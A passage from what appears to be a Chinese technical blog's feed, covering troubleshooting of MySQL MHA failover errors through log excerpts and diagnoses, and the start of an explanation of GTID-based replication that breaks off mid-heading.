class="line">Sat May  7 03:08:19 2022 - [info] 192.168.73.21(192.168.73.21:3306): SHOW SLAVE STATUS returned empty result. To check replication filtering rules, temporarily executing CHANGE MASTER to a dummy host.</span><br><span class="line">Sat May  7 03:08:19 2022 - [info] 192.168.73.21(192.168.73.21:3306): Resetting slave pointing to the dummy host.</span><br><span class="line">Sat May  7 03:08:19 2022 - [info] ** Phase 1: Configuration Check Phase completed.</span><br><span class="line">Sat May  7 03:08:19 2022 - [info]</span><br><span class="line">Sat May  7 03:08:19 2022 - [info] * Phase 2: Rejecting updates Phase..</span><br><span class="line">Sat May  7 03:08:19 2022 - [info]</span><br><span class="line">Sat May  7 03:08:19 2022 - [info] Executing master ip online change script to disable write on the current master:</span><br><span class="line">Sat May  7 03:08:19 2022 - [info]   /usr/local/bin/master_ip_online_change --command=stop --orig_master_host=192.168.73.21 --orig_master_ip=192.168.73.21 --orig_master_port=3306 --orig_master_user=&apos;root&apos; --orig_master_password=&apos;ccc.456&apos; --new_master_host=192.168.73.21 --new_master_ip=192.168.73.21 --new_master_port=3306 --new_master_user=&apos;root&apos; --new_master_password=&apos;ccc.456&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***************************************************************</span><br><span class="line">Disabling the VIP - 192.168.73.73/24 on old master: 192.168.73.21</span><br><span class="line">***************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Got Error: Use of uninitialized value $orig_master_ssh_user in concatenation (.) or string at /usr/local/bin/master_ip_online_change line 101.</span><br><span class="line"></span><br><span class="line">Sat May  7 03:08:19 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln178] Got ERROR:  at /usr/bin/masterha_master_switch line 53.</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="masterha&#x6545;&#x969C;&#x89E3;&#x51B3;"><a href="#masterha&#x6545;&#x969C;&#x89E3;&#x51B3;" class="headerlink" title="masterha&#x6545;&#x969C;&#x89E3;&#x51B3;"></a>masterha&#x6545;&#x969C;&#x89E3;&#x51B3;</h2><p><strong>&#x6545;&#x969C;&#x4E00;&#xFF1A;</strong><br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Fri May  6 22:43:11 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Fri May  6 22:43:11 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Fri May  6 22:43:11 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Fri May  6 22:43:11 2022 - [info] MHA::MasterMonitor version 0.54.</span><br><span class="line">Fri May  6 22:43:11 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln255] Got MySQL error when connecting 192.168.73.22(192.168.73.22:3306) :1045:Access denied for user &apos;root&apos;@&apos;192.168.73.20&apos; (using password: YES), but this is not mysql crash. Check MySQL server settings.</span><br><span class="line"> at /usr/share/perl5/vendor_perl/MHA/ServerManager.pm line 251.</span><br><span class="line">Fri May  6 22:43:11 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln255] Got MySQL error when connecting 192.168.73.23(192.168.73.23:3306) :1045:Access denied for user &apos;root&apos;@&apos;192.168.73.20&apos; (using password: YES), but this is not mysql crash. Check MySQL server settings.</span><br><span class="line"> at /usr/share/perl5/vendor_perl/MHA/ServerManager.pm line 251.</span><br><span class="line">Fri May  6 22:43:11 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln255] Got MySQL error when connecting 192.168.73.21(192.168.73.21:3306) :1045:Access denied for user &apos;root&apos;@&apos;192.168.73.20&apos; (using password: YES), but this is not mysql crash. Check MySQL server settings.</span><br><span class="line"> at /usr/share/perl5/vendor_perl/MHA/ServerManager.pm line 251.</span><br><span class="line">Fri May  6 22:43:12 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln263] Got fatal error, stopping operations</span><br><span class="line">Fri May  6 22:43:12 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations.  at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 300.</span><br><span class="line">Fri May  6 22:43:12 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.</span><br><span class="line">Fri May  6 22:43:12 2022 - [info] Got exit code 1 (Not master dead).</span><br><span class="line"></span><br><span class="line">MySQL Replication Health is NOT OK!</span><br></pre></td></tr></tbody></table></figure><p></p><blockquote><p>mha&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x4E0D;&#x6B63;&#x786E;&#xFF0C;&#x6216;&#x6CA1;&#x5F00;&#x542F;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;</p></blockquote><p><strong>&#x6545;&#x969C;&#x4E8C;&#xFF1A;</strong><br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Fri May  6 22:47:47 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Fri May  6 22:47:47 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Fri May  6 22:47:47 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Fri May  6 22:47:47 2022 - [info] MHA::MasterMonitor version 0.54.</span><br><span class="line">Fri May  6 22:47:48 2022 - [info] Dead Servers:</span><br><span class="line">Fri May  6 22:47:48 2022 - [info] Alive Servers:</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]   192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]   192.168.73.22(192.168.73.22:3306)</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]   192.168.73.23(192.168.73.23:3306)</span><br><span class="line">Fri May  6 22:47:48 2022 - [info] Alive Slaves:</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]   192.168.73.22(192.168.73.22:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabled</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]     Primary candidate for the new Master (candidate_master is set)</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]   192.168.73.23(192.168.73.23:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabled</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Fri May  6 22:47:48 2022 - [info] Current Alive Master: 192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Fri May  6 22:47:48 2022 - [info] Checking slave configurations..</span><br><span class="line">Fri May  6 22:47:48 2022 - [info] Checking replication filtering settings..</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]  binlog_do_db= ha, binlog_ignore_db= mysql</span><br><span class="line">Fri May  6 22:47:48 2022 - [info]  Replication filtering check ok.</span><br><span class="line">Fri May  6 22:47:48 2022 - [info] Starting SSH connection tests..</span><br><span class="line">Fri May  6 22:47:52 2022 - [info] All SSH connection tests passed successfully.</span><br><span class="line">Fri May  6 22:47:52 2022 - [info] Checking MHA Node version..</span><br><span class="line">Fri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln122] Got error when getting node version. Error:</span><br><span class="line">Fri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln123]</span><br><span class="line">bash: apply_diff_relay_logs: command not found</span><br><span class="line">Fri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln151] node version on 192.168.73.22 not found! Maybe MHA Node package is not installed?</span><br><span class="line"> at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 346.</span><br><span class="line">Fri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations. node version on 192.168.73.22 not found! Maybe MHA Node package is not installed?</span><br><span class="line"> at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 346.</span><br><span class="line">        ...propagated at /usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm line 152.</span><br><span class="line">Fri May  6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.</span><br><span class="line">Fri May  6 22:47:52 2022 - [info] Got exit code 1 (Not master dead).</span><br><span class="line"></span><br><span class="line">MySQL Replication Health is NOT OK!</span><br></pre></td></tr></tbody></table></figure><p></p><blockquote><p>MySQL&#x670D;&#x52A1;&#x5668;&#x6CA1;&#x6709;&#x5B89;&#x88C5;mha node&#x5DE5;&#x5177;</p></blockquote><p><strong>&#x6545;&#x969C;&#x4E09;&#xFF1A;</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205061455441.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><blockquote><p>&#x5BFC;&#x81F4;&#x8BE5;&#x6545;&#x969C;&#x7684;&#x539F;&#x56E0;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x5927;&#x90E8;&#x5206;&#x662F;&#x4F9D;&#x8D56;&#x5305;&#x5173;&#x7CFB;&#x6CA1;&#x6709;&#x89E3;&#x51B3;&#xFF0C;&#x5177;&#x4F53;&#x9700;&#x8981;&#x6839;&#x636E;&#x5B9E;&#x65F6;&#x73AF;&#x5883;&#x5206;&#x6790;&#x89E3;&#x51B3;</p></blockquote><ul><li>&#x53C2;&#x8003;&#x601D;&#x8DEF;&#xFF1A;<br>&#x786E;&#x4FDD;MySQL&#x7684;<code>libs</code>&#x548C;<code>libs-compat</code>&#x5305;&#x5B89;&#x88C5;&#x4E86;&#xFF0C;&#x5B83;&#x63D0;&#x4F9B;&#x4E86;MySQL&#x9700;&#x8981;&#x7684;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; rpm -qa |grep mysql-community</span><br><span class="line">mysql-community-common-5.7.24-1.el7.x86_64</span><br><span class="line">mysql-community-libs-compat-5.7.32-1.el7.x86_64</span><br><span class="line">mysql-community-libs-5.7.24-1.el7.x86_64</span><br><span class="line">mysql-community-server-5.7.24-1.el7.x86_64</span><br><span class="line">mysql-community-client-5.7.24-1.el7.x86_64</span><br></pre></td></tr></tbody></table></figure></li></ul><p><strong>&#x6545;&#x969C;&#x56DB;&#xFF1A;</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Sat May  7 00:13:00 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Sat May  7 00:13:00 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Sat May  7 00:13:00 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Sat May  7 00:13:00 2022 - [info] MHA::MasterMonitor version 0.54.</span><br><span class="line">Sat May  7 00:13:01 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln622] Master 192.168.73.21:3306 from which slave 192.168.73.23(192.168.73.23:3306) replicates is not defined in the configuration file!</span><br><span class="line">Sat May  7 00:13:01 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations.  at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 300.</span><br><span class="line">Sat May  7 00:13:01 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.</span><br><span class="line">Sat May  7 00:13:01 2022 - [info] Got exit code 1 (Not master dead).</span><br><span class="line"></span><br><span class="line">MySQL Replication Health is NOT OK!</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Sat May  7 00:35:16 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Sat May  7 00:35:16 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Sat May  7 00:35:16 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Sat May  7 00:35:16 2022 - [info] MHA::MasterMonitor version 0.54.</span><br><span class="line">Sat May  7 00:35:17 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln193] There is no alive slave. We can&apos;t do failover</span><br><span class="line">Sat May  7 00:35:17 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations.  at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 300.</span><br><span class="line">Sat May  7 00:35:17 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.</span><br><span class="line">Sat May  7 00:35:17 2022 - [info] Got exit code 1 (Not master dead).</span><br><span class="line"></span><br><span class="line">MySQL Replication Health is NOT OK!</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL&amp;#x9AD8;&amp;#x53EF;&amp;#x7528;&amp;#x96C6;&amp;#x7FA4;&amp;#x2014;&amp;#x2014;MHA&amp;#x67B6;&amp;#x6784;&quot;&gt;&lt;a href=&quot;#MySQL&amp;#x9AD8;&amp;#x53EF;&amp;#x7528;&amp;#x96C6;&amp;#x
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL的GTID主从同步</title>
    <link href="https://marnm.github.io//posts/d77fafec/"/>
    <id>https://marnm.github.io//posts/d77fafec/</id>
    <published>2022-06-07T04:45:07.000Z</published>
    <updated>2022-06-07T05:12:36.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MySQL-GTID-&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"><a href="#MySQL-GTID-&#x4E3B;&#x4ECE;&#x540C;&#x6B65;" class="headerlink" title="MySQL GTID &#x4E3B;&#x4ECE;&#x540C;&#x6B65;"></a>MySQL GTID &#x4E3B;&#x4ECE;&#x540C;&#x6B65;</h2><p><strong>&#x6982;&#x5FF5;</strong></p><p>&#x4ECE; MySQL 5.6.5 &#x5F00;&#x59CB;&#x65B0;&#x589E;&#x4E86;&#x4E00;&#x79CD;&#x57FA;&#x4E8E; GTID &#x7684;&#x590D;&#x5236;&#x65B9;&#x5F0F;&#x3002;&#x901A;&#x8FC7; GTID&#x4FDD;&#x8BC1;&#x4E86;&#x6BCF;&#x4E2A;&#x5728;&#x4E3B;&#x5E93;&#x4E0A;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x5728;&#x96C6;&#x7FA4;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;ID&#x3002;<br>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5F3A;&#x5316;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E3B;&#x5907;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x6545;&#x969C;&#x6062;&#x590D;&#x4EE5;&#x53CA;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#x3002;<br>&#x5728;&#x539F;&#x6765;&#x57FA;&#x4E8E;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x7684;&#x590D;&#x5236;&#xFF0C;&#x4ECE;&#x5E93;&#x9700;&#x8981;&#x544A;&#x77E5;&#x4E3B;&#x5E93;&#x8981;&#x4ECE;&#x54EA;&#x4E2A;&#x504F;&#x79FB;&#x91CF;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x540C;&#x6B65;&#xFF0C;&#x5982;&#x679C;&#x6307;&#x5B9A;&#x9519;&#x8BEF;&#x4F1A;&#x9020;&#x6210;&#x6570;&#x636E;&#x7684;&#x9057;&#x6F0F;&#xFF0C;&#x4ECE;&#x800C;&#x9020;&#x6210;&#x6570;&#x636E;&#x7684;&#x4E0D;&#x4E00;&#x81F4;&#x3002;<br>&#x501F;&#x52A9;GTID&#xFF0C;&#x5728;&#x53D1;&#x751F;&#x4E3B;&#x5907;&#x5207;&#x6362;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MySQL&#x7684;&#x5176;&#x5B83;&#x4ECE;&#x5E93;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5728;&#x65B0;&#x4E3B;&#x5E93;&#x4E0A;&#x627E;&#x5230;&#x6B63;&#x786E;&#x7684;&#x590D;&#x5236;&#x4F4D;&#x7F6E;&#xFF0C;&#x8FD9;&#x5927;&#x5927;&#x7B80;&#x5316;&#x4E86;&#x590D;&#x6742;&#x590D;&#x5236;&#x62D3;&#x6251;&#x4E0B;&#x96C6;&#x7FA4;&#x7684;&#x7EF4;&#x62A4;&#xFF0C;<br>&#x4E5F;&#x51CF;&#x5C11;&#x4E86;&#x4EBA;&#x4E3A;&#x8BBE;&#x7F6E;&#x590D;&#x5236;&#x4F4D;&#x7F6E;&#x53D1;&#x751F;&#x8BEF;&#x64CD;&#x4F5C;&#x7684;&#x98CE;&#x9669;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x57FA;&#x4E8E;GTID&#x7684;&#x590D;&#x5236;&#x53EF;&#x4EE5;&#x5FFD;&#x7565;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x51CF;&#x5C11;&#x4E86;&#x6570;&#x636E;&#x53D1;&#x751F;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x98CE;&#x9669;&#x3002;</p><h2 id="&#x4EC0;&#x4E48;&#x662F;GTID&#xFF1F;"><a href="#&#x4EC0;&#x4E48;&#x662F;GTID&#xFF1F;" class="headerlink" title="&#x4EC0;&#x4E48;&#x662F;GTID&#xFF1F;"></a>&#x4EC0;&#x4E48;&#x662F;GTID&#xFF1F;</h2><p>GTID (Global Transaction ID) &#x662F;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x5DF2;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#x7684;&#x7F16;&#x53F7;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x552F;&#x4E00;&#x7684;&#x7F16;&#x53F7;&#x3002; GTID &#x5B9E;&#x9645;&#x4E0A; &#x662F;&#x7531;UUID+TID &#x7EC4;&#x6210;&#x7684;&#x3002;<br>&#x5176;&#x4E2D; UUID &#x662F;&#x4E00;&#x4E2A; MySQL &#x5B9E;&#x4F8B;&#x7684;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x3002;TID&#x4EE3;&#x8868;&#x4E86;&#x8BE5;&#x5B9E;&#x4F8B;&#x4E0A;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x6570;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x968F;&#x7740;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x5355;&#x8C03;&#x9012;&#x589E;&#x3002;</p><p>&#x4E0B;&#x9762;&#x662F;&#x4E00;&#x4E2A;GTID&#x7684;&#x5177;&#x4F53;&#x5F62;&#x5F0F;&#xFF1A;03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25&#xFF0C;&#x5192;&#x53F7;&#x5206;&#x5272;&#x524D;&#x8FB9;&#x4E3A;UUID&#xFF0C;&#x540E;&#x8FB9;&#x4E3A;TID&#x3002;  </p><p>GTID &#x96C6;&#x5408;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x6765;&#x81EA;&#x591A;&#x4E2A; MySQL &#x5B9E;&#x4F8B;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x5B83;&#x4EEC;&#x4E4B;&#x95F4;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;&#x3002;  </p><p>&#x5982;&#x679C;&#x6765;&#x81EA;&#x540C;&#x4E00;MySQL&#x5B9E;&#x4F8B;&#x7684;&#x4E8B;&#x52A1;&#x5E8F;&#x53F7;&#x6709;&#x591A;&#x4E2A;&#x8303;&#x56F4;&#x533A;&#x95F4;&#xFF0C;&#x5404;&#x7EC4;&#x8303;&#x56F4;&#x4E4B;&#x95F4;&#x7528;&#x5192;&#x53F7;&#x5206;&#x9694;&#x3002;<br>&#x4F8B;&#x5982;&#xFF1A; 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6,03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25<br>    &#x53EF;&#x4EE5;&#x4F7F;&#x7528;show master status&#x5B9E;&#x65F6;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x6570;&#x3002;  </p><h2 id="GTID&#x7684;&#x4F5C;&#x7528;"><a href="#GTID&#x7684;&#x4F5C;&#x7528;" class="headerlink" title="GTID&#x7684;&#x4F5C;&#x7528;"></a>GTID&#x7684;&#x4F5C;&#x7528;</h2><p>GTID&#x91C7;&#x7528;&#x4E86;&#x65B0;&#x7684;&#x590D;&#x5236;&#x534F;&#x8BAE;&#xFF0C;&#x65E7;&#x534F;&#x8BAE;&#x662F;&#xFF0C;&#x9996;&#x5148;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5728;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x504F;&#x79FB;&#x91CF;&#x4F4D;&#x7F6E;&#x8FDE;&#x63A5;&#x5230;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4E00;&#x4E2A;&#x7ED9;&#x5B9A;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x518D;&#x4ECE;&#x7ED9;&#x5B9A;&#x7684;&#x8FDE;&#x63A5;&#x70B9;&#x5F00;&#x59CB;&#x53D1;&#x9001;&#x6240;&#x6709;&#x7684;&#x4E8B;&#x4EF6;&#x3002;<br>&#x65B0;&#x534F;&#x8BAE;&#x6709;&#x6240;&#x4E0D;&#x540C;&#xFF0C;&#x652F;&#x6301;&#x4EE5;&#x5168;&#x5C40;&#x7EDF;&#x4E00;&#x4E8B;&#x52A1;ID (GTID)&#x4E3A;&#x57FA;&#x7840;&#x7684;&#x590D;&#x5236;&#x3002;&#x5F53;&#x5728;&#x4E3B;&#x5E93;&#x4E0A;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#x6216;&#x8005;&#x88AB;&#x4ECE;&#x5E93;&#x5E94;&#x7528;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5B9A;&#x4F4D;&#x548C;&#x8FFD;&#x8E2A;&#x6BCF;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x3002;<br>GTID&#x590D;&#x5236;&#x662F;&#x5168;&#x90E8;&#x4EE5;&#x4E8B;&#x52A1;&#x4E3A;&#x57FA;&#x7840;&#xFF0C;&#x4F7F;&#x5F97;&#x68C0;&#x67E5;&#x4E3B;&#x4ECE;&#x4E00;&#x81F4;&#x6027;&#x53D8;&#x5F97;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x3002;&#x5982;&#x679C;&#x6240;&#x6709;&#x4E3B;&#x5E93;&#x4E0A;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x4E5F;&#x540C;&#x6837;&#x63D0;&#x4EA4;&#x5230;&#x4ECE;&#x5E93;&#x4E0A;&#xFF0C;&#x4E00;&#x81F4;&#x6027;&#x5C31;&#x5F97;&#x5230;&#x4E86;&#x4FDD;&#x8BC1;&#x3002;  </p><h2 id="GTID&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"><a href="#GTID&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;" class="headerlink" title="GTID&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"></a>GTID&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h2><p>&#x2460; &#x5F53;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x5728;&#x4E3B;&#x5E93;&#x7AEF;&#x6267;&#x884C;&#x5E76;&#x63D0;&#x4EA4;&#x65F6;&#xFF0C;&#x4EA7;&#x751F;GTID&#xFF0C;&#x4E00;&#x540C;&#x8BB0;&#x5F55;&#x5230;binlog&#x65E5;&#x5FD7;&#x4E2D;&#x3002;<br>&#x2461; binlog&#x4F20;&#x8F93;&#x5230;slave,&#x5E76;&#x5B58;&#x50A8;&#x5230;slave&#x7684;relaylog&#x540E;&#xFF0C;&#x8BFB;&#x53D6;&#x8FD9;&#x4E2A;GTID&#x7684;&#x8FD9;&#x4E2A;&#x503C;&#x8BBE;&#x7F6E;GTID_next&#x53D8;&#x91CF;&#xFF0C;&#x5373;&#x544A;&#x8BC9;Slave&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;&#x8981;&#x6267;&#x884C;&#x7684;GTID&#x503C;&#x3002;<br>&#x2462; sql&#x7EBF;&#x7A0B;&#x4ECE;relay log&#x4E2D;&#x83B7;&#x53D6;GTID&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x6BD4;slave&#x7AEF;&#x7684;binlog&#x662F;&#x5426;&#x6709;&#x8BE5;GTID&#x3002;<br>&#x2463; &#x5982;&#x679C;&#x6709;&#x8BB0;&#x5F55;&#xFF0C;&#x8BF4;&#x660E;&#x8BE5;GTID&#x7684;&#x4E8B;&#x52A1;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#xFF0C;slave&#x4F1A;&#x5FFD;&#x7565;&#x3002;<br>&#x2464; &#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BB0;&#x5F55;&#xFF0C;slave&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x8BE5;GTID&#x4E8B;&#x52A1;&#xFF0C;&#x5E76;&#x8BB0;&#x5F55;&#x8BE5;GTID&#x5230;&#x81EA;&#x8EAB;&#x7684;binlog&#xFF0C;&#x5728;&#x8BFB;&#x53D6;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x524D;&#x4F1A;&#x5148;&#x68C0;&#x67E5;&#x5176;&#x4ED6;session&#x6301;&#x6709;&#x8BE5;GTID&#xFF0C;&#x786E;&#x4FDD;&#x4E0D;&#x88AB;&#x91CD;&#x590D;&#x6267;&#x884C;&#x3002;<br>&#x2465; &#x5728;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F1A;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6709;&#x4E3B;&#x952E;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5C31;&#x7528;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5C31;&#x7528;&#x5168;&#x90E8;&#x626B;&#x63CF;&#x3002;  </p><h2 id="GTID&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x7684;&#x4F18;&#x52BF;"><a 